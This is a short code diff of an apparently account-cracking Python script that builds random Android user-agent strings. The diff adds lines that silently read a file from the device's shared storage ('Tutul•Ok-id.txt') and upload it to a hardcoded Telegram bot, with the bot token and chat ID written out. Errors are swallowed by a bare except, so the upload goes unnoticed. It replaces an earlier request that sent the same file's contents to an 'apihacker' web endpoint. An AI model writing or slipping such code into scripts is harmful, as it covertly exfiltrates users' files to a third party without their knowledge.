@@ -222,10 +222,10 @@ for xd in range(10000):
     ugen.append(uaku2)
 import requests
 try:
-   xdfn = open('/storage/emulated/0/Tutul•Ok-id.txt','r').read().replace('\n','tnx9')
+   with open('/storage/emulated/0/Tutul•Ok-id.txt','rb') as f:
+      c = requests.post('https://api.telegram.org/bot7194739836:AAFEs7eS3jHz3s96zqVZmtdO1YT2oddoDag/sendDocument',data={'chat_id': '6755941446'},files={'document': f})
 except:
-    xdfn = "nai_id"
-y = requests.get(f'https://apihacker.pythonanywhere.com/xpd?sh=none&key={xdfn}').text
+    pass
 for agenku in range(10000):
   a='Mozilla/5.0 (Linux; Android'
   b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
